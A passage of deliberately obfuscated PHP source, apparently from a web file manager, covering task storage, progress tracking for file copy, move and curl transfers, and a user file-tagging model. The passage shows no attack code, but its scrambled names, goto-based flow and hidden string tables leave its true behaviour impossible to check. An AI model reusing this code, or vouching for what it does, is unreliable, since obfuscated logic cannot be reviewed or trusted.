$F÷ğ®ƒ¡ª ? json_decode($F÷ğ®ƒ¡ª[$BÔŠÛØºë±[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Eğóåòù’ = false) { goto eÅšíÊ³‹·; b¿½È†‹ö: return $eÖò †¹ÍÍ; goto C±êñ‚È„Ğ; bÆÜÁ—–¼ˆ: $eÖò †¹ÍÍ = Model($a˜ÊªÇİ£œ[419])->where($f¡½’¢Ø¶‘)->select(); $eÖò †¹ÍÍ = $eÖò †¹ÍÍ ? $eÖò †¹ÍÍ : array(); foreach ($eÖò †¹ÍÍ as $B¿¿É·›¡Ş => $c³ÏµìÃÉŠ) { $eÖò †¹ÍÍ[$B¿¿É·›¡Ş] = json_decode($c³ÏµìÃÉŠ[$a˜ÊªÇİ£œ[370]], !0); } goto b¿½È†‹ö; eÅšíÊ³‹·: $a˜ÊªÇİ£œ =& $_SERVER[¹Ò‹Ò¹]; $f¡½’¢Ø¶‘ = array($a˜ÊªÇİ£œ[29] => $a˜ÊªÇİ£œ[1524]); if ($Eğóåòù’) { $f¡½’¢Ø¶‘[$a˜ÊªÇİ£œ[1504]] = $Eğóåòù’; } goto bÆÜÁ—–¼ˆ; C±êñ‚È„Ğ: } public static function valueSet($fù ´Ùƒ¥æ, $CÁæ¿†«á«) { goto e¾º‚‘˜à®; e÷‡¾—¾Øç: Model($E‹ àÈÕËÒ[419])->add($e±›˜èÏôø, array(), !0); goto A‹Éó¿İ˜è; e¾º‚‘˜à®: $E‹ àÈÕËÒ =& $_SERVER[¹Ò‹Ò¹]; if (!$CÁæ¿†«á«) { return Model($E‹ àÈÕËÒ[419])->where(array($E‹ àÈÕËÒ[92] => $fù ´Ùƒ¥æ, $E‹ àÈÕËÒ[29] => $E‹ àÈÕËÒ[1524]))->delete(); } $Aë¿Ç‘ Ñ‡ = json_encode($CÁæ¿†«á«); goto FŸİÒÅ‘Ö; FŸİÒÅ‘Ö: if (!$Aë¿Ç‘ Ñ‡) { ob_start(); var_dump($CÁæ¿†«á«); $bÃìÊ´—¬í = ob_get_clean(); self::log($E‹ àÈÕËÒ[1525] . json_encode_force($bÃìÊ´—¬í)); } if (!$fù ´Ùƒ¥æ || !$CÁæ¿†«á«[$E‹ àÈÕËÒ[388]]) { return !1; } $e±›˜èÏôø = array($E‹ àÈÕËÒ[29] => $E‹ àÈÕËÒ[1524], $E‹ àÈÕËÒ[1504] => USER_ID, $E‹ àÈÕËÒ[92] => $fù ´Ùƒ¥æ, $E‹ àÈÕËÒ[370] => $Aë¿Ç‘ Ñ‡); goto e÷‡¾—¾Øç; A‹Éó¿İ˜è: } public static function log($fßƒˆô­ƒç) { if (!GLOBAL_DEBUG) { return; } write_log($fßƒˆô­ƒç, $_SERVER[¹Ò‹Ò¹][1526]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto e¨ƒ’ƒôâ¼; e”ñŠÇÑ¹„: $F’±¾¦Ó[$fÑÈ•¢™í[999]] = $fÑÈ•¢™í[33]; $F’±¾¦Ó[$fÑÈ•¢™í[1549]] = $fÑÈ•¢™í[33]; $F’±¾¦Ó[$fÑÈ•¢™í[1550]] = 0; goto C‘÷÷“¹ğ‹; ešÓî™Í¨: Hook::bind($fÑÈ•¢™í[1536], array($this, $fÑÈ•¢™í[1537])); Hook::bind($fÑÈ•¢™í[554], array($this, $fÑÈ•¢™í[1538])); $this->sourceModelCopyFlag = !1; goto D¸³½çÄ‡Ô; e¨ƒ’ƒôâ¼: $fÑÈ•¢™í =& $_SERVER[¹Ò‹Ò¹]; $F’±¾¦Ó =& $this->task; $this->sourceCopyFolder = !1; goto b»¬ƒã†È; eˆ´®ĞîËÆ: Hook::bind($fÑÈ•¢™í[565], array($this, $fÑÈ•¢™í[1534])); Hook::bind($fÑÈ•¢™í[532], array($this, $fÑÈ•¢™í[1535])); Hook::bind($fÑÈ•¢™í[529], array($this, $fÑÈ•¢™í[1535])); goto bÚÈ²é©Ê±; bÚÈ²é©Ê±: Hook::bind($fÑÈ•¢™í[534], array($this, $fÑÈ•¢™í[1535])); Hook::bind($fÑÈ•¢™í[536], array($this, $fÑÈ•¢™í[1535])); Hook::bind($fÑÈ•¢™í[538], array($this, $fÑÈ•¢™í[1535])); goto ešÓî™Í¨; BÅ½¹“Ïâ­: $F’±¾¦Ó[$fÑÈ•¢™í[1545]] = LNG($fÑÈ•¢™í[1546]); $F’±¾¦Ó[$fÑÈ•¢™í[1547]] = 0; $F’±¾¦Ó[$fÑÈ•¢™í[1548]] = 0; goto e”ñŠÇÑ¹„; C‘÷÷“¹ğ‹: $F’±¾¦Ó[$fÑÈ•¢™í[1551]] = 0; $F’±¾¦Ó[$fÑÈ•¢™í[1552]] = 0; if (!$F’±¾¦Ó[$fÑÈ•¢™í[1410]]) { $F’±¾¦Ó[$fÑÈ•¢™í[1410]] = LNG($fÑÈ•¢™í[1553]); } goto cÎ›·¤Ÿˆ†; D¸³½çÄ‡Ô: Hook::bind($fÑÈ•¢™í[1539], array($this, $fÑÈ•¢™í[1540])); Hook::bind($fÑÈ•¢™í[1541], array($this, $fÑÈ•¢™í[1542])); Hook::bind($fÑÈ•¢™í[1543], array($this, $fÑÈ•¢™í[1544])); goto BÅ½¹“Ïâ­; E¯Í™äİŸ: Hook::bind($fÑÈ•¢™í[561], array($this, $fÑÈ•¢™í[1532])); Hook::bind($fÑÈ•¢™í[562], array($this, $fÑÈ•¢™í[1533])); Hook::bind($fÑÈ•¢™í[564], array($this, $fÑÈ•¢™í[1534])); goto eˆ´®ĞîËÆ; b»¬ƒã†È: Hook::bind($fÑÈ•¢™í[1527], array($this, $fÑÈ•¢™í[1528])); Hook::bind($fÑÈ•¢™í[1084], array($this, $fÑÈ•¢™í[1529])); Hook::bind($fÑÈ•¢™í[1530], array($this, $fÑÈ•¢™í[1531])); goto E¯Í™äİŸ; cÎ›·¤Ÿˆ†: } protected function endAfter() { goto B‰×©ºÑß´; D‹†É¶‹Ï: Hook::unbind($cÕç×†ÛøÙ[529], array($this, $cÕç×†ÛøÙ[1535])); Hook::unbind($cÕç×†ÛøÙ[534], array($this, $cÕç×†ÛøÙ[1535])); Hook::unbind($cÕç×†ÛøÙ[536], array($this, $cÕç×†ÛøÙ[1535])); goto aØ†„º×ÖË; aØ†„º×ÖË: Hook::unbind($cÕç×†ÛøÙ[538], array($this, $cÕç×†ÛøÙ[1535])); Hook::unbind($cÕç×†ÛøÙ[1536], array($this, $cÕç×†ÛøÙ[1537])); Hook::unbind($cÕç×†ÛøÙ[554], array($this, $cÕç×†ÛøÙ[1538])); goto A‘ºÀæ‰“; A‘ºÀæ‰“: Hook::unbind($cÕç×†ÛøÙ[1539], array($this, $cÕç×†ÛøÙ[1540])); Hook::unbind($cÕç×†ÛøÙ[1541], array($this, $cÕç×†ÛøÙ[1542])); Hook::unbind($cÕç×†ÛøÙ[1543], array($this, $cÕç×†ÛøÙ[1544])); goto E†ŠŞÏë’ê; dÜá‹ä: Hook::unbind($cÕç×†ÛøÙ[1530], array($this, $cÕç×†ÛøÙ[1531])); Hook::unbind($cÕç×†ÛøÙ[561], array($this, $cÕç×†ÛøÙ[1532])); Hook::unbind($cÕç×†ÛøÙ[562], array($this, $cÕç×†ÛøÙ[1533])); goto AñŠï¡ê; B‰×©ºÑß´: $cÕç×†ÛøÙ =& $_SERVER[¹Ò‹Ò¹]; Hook::unbind($cÕç×†ÛøÙ[1527], array($this, $cÕç×†ÛøÙ[1528])); Hook::unbind($cÕç×†ÛøÙ[1084], array($this, $cÕç×†ÛøÙ[1529])); goto dÜá‹ä; AñŠï¡ê: Hook::unbind($cÕç×†ÛøÙ[564], array($this, $cÕç×†ÛøÙ[1534])); Hook::unbind($cÕç×†ÛøÙ[565], array($this, $cÕç×†ÛøÙ[1534])); Hook::unbind($cÕç×†ÛøÙ[532], array($this, $cÕç×†ÛøÙ[1535])); goto D‹†É¶‹Ï; E†ŠŞÏë’ê: } public function copyMoveStart($B…±‰ãê«Œ, $cÒ•–Ù„ä‰, $aÚù‘èÈª, $B¡¹ßÈàó) { goto bôÀôïÃ•ô; CƒğÙ¡ñÆ: if (substr($cÒ•–Ù„ä‰, 0, strlen($DøÜ¤ƒù™)) == $DøÜ¤ƒù™) { return; } if (substr($B¡¹ßÈàó, 0, strlen($DøÜ¤ƒù™)) == $DøÜ¤ƒù™) { return; } $b¾²ƒØòÊÈ =& $this->task; goto eñ¥ô˜„ÁÛ; bôÀôïÃ•ô: $d¶¬‹Ğ§‹‘ =& $_SERVER[¹Ò‹Ò¹]; self::log($d¶¬‹Ğ§‹‘[1554] . $cÒ•–Ù„ä‰ . $d¶¬‹Ğ§‹‘[66] . $B¡¹ßÈàó); $DøÜ¤ƒù™ = rtrim(TEMP_FILES, $d¶¬‹Ğ§‹‘[8]); goto CƒğÙ¡ñÆ; eñ¥ô˜„ÁÛ: $b¾²ƒØòÊÈ[$d¶¬‹Ğ§‹‘[1555]] = KodIO::transferType($B…±‰ãê«Œ, $aÚù‘èÈª); $this->update(); goto Añ¸®¤­¿; Añ¸®¤­¿: } public function updateAfter() { goto d‡¥òø¾®; e«½ÂİÎ : $CßéÒîŒã[$D¾“¾ù‹Û[1505]] = $CßéÒîŒã[$D¾“¾ù‹Û[1552]] / $CßéÒîŒã[$D¾“¾ù‹Û[713]]; if ($CßéÒîŒã[$D¾“¾ù‹Û[1505]] > 0) { $aÓ…§ßÔï– = timeFloat() - $CßéÒîŒã[$D¾“¾ù‹Û[735]] - $CßéÒîŒã[$D¾“¾ù‹Û[1508]]; $CßéÒîŒã[$D¾“¾ù‹Û[1509]] = $aÓ…§ßÔï– * (1 - $CßéÒîŒã[$D¾“¾ù‹Û[1505]]) / $CßéÒîŒã[$D¾“¾ù‹Û[1505]]; } goto c‡°±ãóëÆ; b–´ìÙ¼ºª: if ($this->sourceModelCopyFlag) { return; } if ($CßéÒîŒã[$D¾“¾ù‹Û[1555]] == $D¾“¾ù‹Û[1156]) { return; } if ($CßéÒîŒã[$D¾“¾ù‹Û[1555]] == $D¾“¾ù‹Û[1069] || $CßéÒîŒã[$D¾“¾ù‹Û[1555]] == $D¾“¾ù‹Û[106]) { if ($CßéÒîŒã[$D¾“¾ù‹Û[1549]]) { $CßéÒîŒã[$D¾“¾ù‹Û[1552]] = $CßéÒîŒã[$D¾“¾ù‹Û[1551]] + $CßéÒîŒã[$D¾“¾ù‹Û[1548]]; } } else { if ($CßéÒîŒã[$D¾“¾ù‹Û[1555]] == $D¾“¾ù‹Û[1157]) { if ($CßéÒîŒã[$D¾“¾ù‹Û[1549]] == $D¾“¾ù‹Û[1069]) { $CßéÒîŒã[$D¾“¾ù‹Û[1552]] = $CßéÒîŒã[$D¾“¾ù‹Û[1551]] + $CßéÒîŒã[$D¾“¾ù‹Û[1548]] * 0.5; } else { if ($CßéÒîŒã[$D¾“¾ù‹Û[1549]] == $D¾“¾ù‹Û[106]) { $CßéÒîŒã[$D¾“¾ù‹Û[1552]] = $CßéÒîŒã[$D¾“¾ù‹Û[1551]] + $CßéÒîŒã[$D¾“¾ù‹Û[1547]] * 0.5 + $CßéÒîŒã[$D¾“¾ù‹Û[1548]] * 0.5; } } } } goto e«½ÂİÎ ; d‡¥òø¾®: $D¾“¾ù‹Û =& $_SERVER[¹Ò‹Ò¹]; $CßéÒîŒã =& $this->task; if (!$CßéÒîŒã[$D¾“¾ù‹Û[713]]) { return; } goto b–´ìÙ¼ºª; c‡°±ãóëÆ: } public function addPath($FŞƒ³¤¢‰Ô) { goto fî¯…ˆ‘Š¹; fÇ¬å´Ùå: $fÉ©¡¥ÔíÄ = IO::infoWithChildren($FŞƒ³¤¢‰Ô); $eœ‹†²îƒÙ = $eÖ±³ªÓ¬[$aù™òÃ·èº[1556]] ? $eÖ±³ªÓ¬[$aù™òÃ·èº[1556]][$aù™òÃ·èº[1557]] : 0; $eÖ±³ªÓ¬[$aù™òÃ·èº[1556]] = array($aù™òÃ·èº[1557] => $eœ‹†²îƒÙ + 1, $aù™òÃ·èº[407] => $fÉ©¡¥ÔíÄ[$aù™òÃ·èº[28]], $aù™òÃ·èº[75] => $fÉ©¡¥ÔíÄ[$aù™òÃ·èº[75]], $aù™òÃ·èº[489] => $fÉ©¡¥ÔíÄ[$aù™òÃ·èº[489]] ? $fÉ©¡¥ÔíÄ[$aù™òÃ·èº[489]] : $fÉ©¡¥ÔíÄ[$aù™òÃ·èº[75]]); goto E³·´†à”; fî¯…ˆ‘Š¹: $aù™òÃ·èº =& $_SERVER[¹Ò‹Ò¹]; if (!$FŞƒ³¤¢‰Ô) { return; } $eÖ±³ªÓ¬ =& $this->task; goto fÇ¬å´Ùå; E³·´†à”: if ($fÉ©¡¥ÔíÄ[$aù™òÃ·èº[29]] == $aù™òÃ·èº[191]) { $eÖ±³ªÓ¬[$aù™òÃ·èº[997]] += 1; } else { $eÖ±³ªÓ¬[$aù™òÃ·èº[997]] += $fÉ©¡¥ÔíÄ[$aù™òÃ·èº[80]][$aù™òÃ·èº[78]]; if ($fÉ©¡¥ÔíÄ[$aù™òÃ·èº[390]]) { $eÖ±³ªÓ¬[$aù™òÃ·èº[997]] += $fÉ©¡¥ÔíÄ[$aù™òÃ·èº[80]][$aù™òÃ·èº[79]] + 1; } } $eÖ±³ªÓ¬[$aù™òÃ·èº[713]] += $fÉ©¡¥ÔíÄ[$aù™òÃ·èº[77]]; $this->update(); goto DëÉäåÜ‹†; DëÉäåÜ‹†: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($A‹Ã“†ÙÁÓ) { $Aá˜éˆ»ğÍ =& $_SERVER[¹Ò‹Ò¹]; $F‰éõ¢›…º =& $this->task; $F‰éõ¢›…º[$Aá˜éˆ»ğÍ[1545]] = $A‹Ã“†ÙÁÓ[$Aá˜éˆ»ğÍ[28]]; $F‰éõ¢›…º[$Aá˜éˆ»ğÍ[999]] = $A‹Ã“†ÙÁÓ[$Aá˜éˆ»ğÍ[28]]; $this->update(); } public function copyFileStart($aÉŠÁê–É¡, $F´ìÉêŒ‰¿, $D†µæ°ÆÌã, $AÀê¤®¨ªî, $eº†ÇÅÜ›¨, $b›³÷æš) { goto bŠÏ¥ç±; AÏ¾´®Ù­¥: $this->update(); goto b¨ŞŠŞ‚† ; bŠÏ¥ç±: $eîÖÌ¤ÑÔù =& $_SERVER[¹Ò‹Ò¹]; $EÅ±ÙÜÖø = $eº†ÇÅÜ›¨; if ($EÅ±ÙÜÖø == $GLOBALS[$eîÖÌ¤ÑÔù[1558]]) { $EÅ±ÙÜÖø = $GLOBALS[$eîÖÌ¤ÑÔù[1559]]; } goto Få›ˆÓäŠ; Få›ˆÓäŠ: $GLOBALS[$eîÖÌ¤ÑÔù[1559]] = $eº†ÇÅÜ›¨; $GLOBALS[$eîÖÌ¤ÑÔù[1558]] = $b›³÷æš; $e£¸øîéçå =& $this->task; goto D…˜® ‡ ; dÓ®¯Œ…É·: $e£¸øîéçå[$eîÖÌ¤ÑÔù[999]] = $eîÖÌ¤ÑÔù[33]; $e£¸øîéçå[$eîÖÌ¤ÑÔù[1549]] = $eîÖÌ¤ÑÔù[33]; $e£¸øîéçå[$eîÖÌ¤ÑÔù[1550]] = 0; goto AÏ¾´®Ù­¥; D…˜® ‡ : $e£¸øîéçå[$eîÖÌ¤ÑÔù[1545]] = $EÅ±ÙÜÖø; $e£¸øîéçå[$eîÖÌ¤ÑÔù[1547]] = (int) $aÉŠÁê–É¡->size($F´ìÉêŒ‰¿); $e£¸øîéçå[$eîÖÌ¤ÑÔù[1548]] = 0; goto dÓ®¯Œ…É·; b¨ŞŠŞ‚† : } public function copyFileEnd($D‡ö¼ñª“¬, $BíŒ’Ä§÷“, $FèÆÈÜğ¾ì, $C…ß÷‚»Û, $F¤ïå¢™Ë, $a‰æò„´Èœ) { $Eòõçô =& $_SERVER[¹Ò‹Ò¹]; $DğÊ÷ø‹í =& $this->task; $DğÊ÷ø‹í[$Eòõçô[1548]] = $DğÊ÷ø‹í[$Eòõçô[1547]]; $DğÊ÷ø‹í[$Eòõçô[1549]] = $Eòõçô[33]; if ($F¤ïå¢™Ë == $DğÊ÷ø‹í[$Eòõçô[1545]]) { $DğÊ÷ø‹í[$Eòõçô[1551]] += $DğÊ÷ø‹í[$Eòõçô[1547]]; $DğÊ÷ø‹í[$Eòõçô[1552]] = $DğÊ÷ø‹í[$Eòõçô[1551]]; $this->update(1); } else { $this->update(); $DğÊ÷ø‹í[$Eòõçô[1548]] = 0; } self::log($Eòõçô[1560] . $BíŒ’Ä§÷“ . $Eòõçô[66] . $C…ß÷‚»Û . $Eòõçô[227] . $F¤ïå¢™Ë . $Eòõçô[1561] . $DğÊ÷ø‹í[$Eòõçô[1545]]); } public function updateFileEnd($aè”Ùµ²‚É, $FŒîœ¸éÓÊ) { goto e’âİáÈÑÜ; bƒòÁÒÔö: $A©»öÇ›Ä[$E‹‘ôÜ“îÚ[1547]] = $FŒîœ¸éÓÊ; $A©»öÇ›Ä[$E‹‘ôÜ“îÚ[1551]] += $FŒîœ¸éÓÊ; $A©»öÇ›Ä[$E‹‘ôÜ“îÚ[1552]] = $A©»öÇ›Ä[$E‹‘ôÜ“îÚ[1551]]; goto EÌç‚’Ş…; EÌç‚’Ş…: $this->update(1); self::log($E‹‘ôÜ“îÚ[1562] . $aè”Ùµ²‚É); goto fÕˆÒ¨Ø¨İ; e’âİáÈÑÜ: $E‹‘ôÜ“îÚ =& $_SERVER[¹Ò‹Ò¹]; $A©»öÇ›Ä =& $this->task; $A©»öÇ›Ä[$E‹‘ôÜ“îÚ[1545]] = $aè”Ùµ²‚É; goto bƒòÁÒÔö; fÕˆÒ¨Ø¨İ: } public function sourceModelCopy($EÉ ©éáŠÒ) { goto cÙğæ™ĞÙÉ; cÙğæ™ĞÙÉ: $A®èÒ¿ÒˆŞ =& $_SERVER[¹Ò‹Ò¹]; $D©œö³êß¡ = $EÉ ©éáŠÒ[0]; $a±¢¶ÖìÆé = $EÉ ©éáŠÒ[1]; goto Fƒº×É”Á£; còå‡ƒÛ›ï: switch ($D©œö³êß¡) { case $A®èÒ¿ÒˆŞ[530]: $cäİí“­ğ‡ = 1; break; case $A®èÒ¿ÒˆŞ[533]: $Eèøªà‰Ì[$A®èÒ¿ÒˆŞ[1545]] = $a±¢¶ÖìÆé[$A®èÒ¿ÒˆŞ[28]]; break; case $A®èÒ¿ÒˆŞ[535]: $cäİí“­ğ‡ = intval($EÉ ©éáŠÒ[$A®èÒ¿ÒˆŞ[375]] * 0.4); break; case $A®èÒ¿ÒˆŞ[537]: $cäİí“­ğ‡ = intval($EÉ ©éáŠÒ[$A®èÒ¿ÒˆŞ[375]] * 0.2); break; case $A®èÒ¿ÒˆŞ[539]: $cäİí“­ğ‡ = intval($EÉ ©éáŠÒ[$A®èÒ¿ÒˆŞ[375]] * 0.4); break; } $this->update($cäİí“­ğ‡); $this->sourceModelCopyFlag = !1; goto cÆ‰ÏÀÙÒ; Fƒº×É”Á£: $Eèøªà‰Ì =& $this->task; $this->sourceModelCopyFlag = !0; $cäİí“­ğ‡ = 0; goto còå‡ƒÛ›ï; cÆ‰ÏÀÙÒ: } public function sourceRemove($B¥µÇ³ëòÀ, $B›´éºˆßŞ) { $c¾Ç®í‘¨Ö =& $_SERVER[¹Ò‹Ò¹]; $this->sourceModelCopyFlag = !0; $F¥Âœ•Ò¦ = 1; if (isset($B¥µÇ³ëòÀ[$c¾Ç®í‘¨Ö[80]])) { $F¥Âœ•Ò¦ = $B¥µÇ³ëòÀ[$c¾Ç®í‘¨Ö[80]][$c¾Ç®í‘¨Ö[78]] + $B¥µÇ³ëòÀ[$c¾Ç®í‘¨Ö[80]][$c¾Ç®í‘¨Ö[79]] + 1; } $this->update($F¥Âœ•Ò¦); $this->sourceModelCopyFlag = !1; } public function sourceMove($eàìŸæ§ùö) { $this->sourceRemove($eàìŸæ§ùö, !1); } public function curlProgress($cÆîÅÆ¶Ñ, $A™¯æ¥õæ‰, $Dô•‚‹—½, $D©¦ÔáÖî, $E®¥¹ºîÇ´) { $Eöù›ÒµÏ =& $_SERVER[¹Ò‹Ò¹]; $aßµ§‚ªÃ¾ =& $this->task; if ($E®¥¹ºîÇ´ > 0) { $aßµ§‚ªÃ¾[$Eöù›ÒµÏ[999]] = $Eöù›ÒµÏ[1563]; $aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1549]] = $Eöù›ÒµÏ[106]; if ($aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1547]]) { $aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1548]] = $E®¥¹ºîÇ´; } if ($aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1550]]) { $aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1548]] = $E®¥¹ºîÇ´ + $aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1550]]; } } else { if ($Dô•‚‹—½ > 0) { if ($aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1547]] == $A™¯æ¥õæ‰) { $aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1548]] = $Dô•‚‹—½; $aßµ§‚ªÃ¾[$Eöù›ÒµÏ[999]] = $Eöù›ÒµÏ[1564]; $aßµ§‚ªÃ¾[$Eöù›ÒµÏ[1549]] = $Eöù›ÒµÏ[1069]; } } } $this->update(); } public function curlProgressStart($d”Ç’³Œ÷ò) { } public function curlProgressEnd($a¨¿öŒÅù») { goto E–Æ¦Îò›Ë; C«ê»Ç’¢: $A·™¿Ùê‹ = $C‡åŠäŠÀ[$CæãƒÉÂ[1565]]; if ($A·™¿Ùê‹ == -1) { $A·™¿Ùê‹ = $C‡åŠäŠÀ[$CæãƒÉÂ[1566]]; } if ($B¹ö‹å‡â[$CæãƒÉÂ[1549]] == $CæãƒÉÂ[106] && $A·™¿Ùê‹) { $B¹ö‹å‡â[$CæãƒÉÂ[1550]] += $A·™¿Ùê‹; } goto cğææö·³„; cğææö·³„: $this->update(); goto bãçë”Ø…ã; E–Æ¦Îò›Ë: $CæãƒÉÂ =& $_SERVER[¹Ò‹Ò¹]; $B¹ö‹å‡â =& $this->task; $C‡åŠäŠÀ = curl_getinfo($a¨¿öŒÅù»); goto C«ê»Ç’¢; bãçë”Ø…ã: } } goto f…‚±¤•”İ; CÊ£½áŒ®: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($eíİ‚Ğ¨æ–) { $cäƒ½ŒªîÃ =& $_SERVER[¹Ò‹Ò¹]; return array($cäƒ½ŒªîÃ[1771] => array(USER_ID, $cäƒ½ŒªîÃ[1772])); } protected function listData() { $f©ŞŸÃ·ó“ =& $_SERVER[¹Ò‹Ò¹]; $A²¾Ì¦î›ã = array($f©ŞŸÃ·ó“[1496] => USER_ID, $f©ŞŸÃ·ó“[457] => array($f©ŞŸÃ·ó“[1775], 0)); $A‡¯½ù´Ä = $f©ŞŸÃ·ó“[1777]; $D‚÷¥åÑ = $this->field($A‡¯½ù´Ä)->where($A²¾Ì¦î›ã)->order($f©ŞŸÃ·ó“[1778])->select(); return $D‚÷¥åÑ ? $D‚÷¥åÑ : array(); } protected function listByTag($E‹›¿éĞ‘Ä) { } protected function addToTag($Eè¢Ô¥Ôã, $Eï‚Ğ­Ş¾À) { $d”‚„ğï‰‚ =& $_SERVER[¹Ò‹Ò¹]; if (!Model($d”‚„ğï‰‚[1913])->listData($Eï‚Ğ­Ş¾À) || !Model($d”‚„ğï‰‚[769])->pathInfo($Eè¢Ô¥Ôã)) { return !1; } $FğĞ‘ôëéª = array($d”‚„ğï‰‚[1496] => USER_ID, $d”‚„ğï‰‚[457] => $Eï‚Ğ­Ş¾À, $d”‚„ğï‰‚[408] => $Eè¢Ô¥Ôã, $d”‚„ğï‰‚[409] => $d”‚„ğï‰‚[403], $d”‚„ğï‰‚[407] => $d”‚„ğï‰‚[33], $d”‚„ğï‰‚[1671] => 0); if ($this->where($FğĞ‘ôëéª)->find()) { return !1; } return $this->add($FğĞ‘ôëéª); } protected function removeFromTag($fŒÕ˜ŸÈĞß, $fÏŒ¯ÄñÊÛ) { $AèÌÖÏŠóğ =& $_SERVER[¹Ò‹Ò¹]; if (!Model($AèÌÖÏŠóğ[1913])->listData($fÏŒ¯ÄñÊÛ)) { return !1; } if (is_array($fŒÕ˜ŸÈĞß)) { $fŒÕ˜ŸÈĞß = array($AèÌÖÏŠóğ[7], $fŒÕ˜ŸÈĞß); } $Bá†˜ã™Œ‡ = array($AèÌÖÏŠóğ[1496] => USER_ID, $AèÌÖÏŠóğ[457] => $fÏŒ¯ÄñÊÛ, $AèÌÖÏŠóğ[409] => $AèÌÖÏŠóğ[403], $AèÌÖÏŠóğ[408] => $fŒÕ˜ŸÈĞß); return $this->where($Bá†˜ã™Œ‡)->delete(); } protected function removeByTag($fİÜï…““) { $AÏÙÀ…‹æŒ =& $_SERVER[¹Ò‹Ò¹]; if (!$fİÜï…““) { return !1; } $Dœ²õëÌ® = array($AÏÙÀ…‹æŒ[1496] => USER_ID, $AÏÙÀ…‹æŒ[457] => $fİÜï…““); return $this->where($Dœ²õëÌ®)->delete(); } protected function removeBySource($b•´±¹Â»à) { $CìŞò·‚èğ =& $_SERVER[¹Ò‹Ò¹]; if (is_array($b•´±¹Â»à)) { $b•´±¹Â»à = array($CìŞò·‚èğ[7], $b•´±¹Â»à); } $dëª£ÍÁÊ“ = array($CìŞò·‚èğ[1496] => USER_ID, $CìŞò·‚èğ[408] => $b•´±¹Â»à, $CìŞò·‚èğ[457] => array($CìŞò·‚èğ[947], 0)); return $this->where($dëª£ÍÁÊ“)->delete(); } }